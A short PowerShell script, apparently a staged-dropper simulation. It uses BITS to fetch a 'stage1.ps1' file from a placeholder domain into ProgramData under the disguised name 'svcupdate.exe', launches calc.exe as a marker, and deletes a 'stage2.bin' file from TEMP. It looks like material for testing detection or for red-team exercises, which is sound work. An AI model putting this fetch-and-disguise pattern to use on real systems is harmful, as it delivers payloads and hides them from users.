[CmdletBinding()]
param(
    [string]$TransferUrl = "https://adatum.com/stage1.ps1",
    [string]$DownloadPath = "C:\ProgramData\svcupdate.exe",
    [int]$StageTimeout = 27
)
Start-BitsTransfer -Source $TransferUrl -Destination $DownloadPath
Start-Process -FilePath "calc.exe"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
